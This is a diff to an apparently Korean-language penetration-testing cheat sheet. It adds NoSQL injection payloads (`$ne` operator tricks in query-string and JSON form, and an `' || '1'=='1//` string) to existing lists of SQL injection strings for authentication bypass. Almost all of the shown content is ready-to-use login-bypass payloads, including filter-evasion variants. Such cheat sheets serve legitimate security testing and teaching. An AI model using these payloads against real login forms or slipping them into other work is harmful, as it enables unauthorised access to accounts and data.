@@ -27,6 +27,11 @@ admin')-- -     # 괄호가 있는 경우
 admin')#
 admin')/**/or/**/1=1;#  # 공백 필터링
 admin')/**/or/**/1=1;-- -
+
+# Nosql
+username[$ne]=toto&password[$ne]=toto
+{"username": {"$ne": null}, "password": {"$ne": null} }
+' || '1'=='1//
 ```
 
 ### 인증 우회 (Authentication Bypass)
@@ -41,6 +46,11 @@ password : password' or '1'='1
 
 # 매번 `이나 '를 붙여서 작동하는 것은 아니다.
 username : admin or 1=1;-- -
+
+# Nosql
+username[$ne]=toto&password[$ne]=toto
+{"username": {"$ne": null}, "password": {"$ne": null} }
+' || '1'=='1//
 ```
 
 ### UNION 기반 데이터 추출
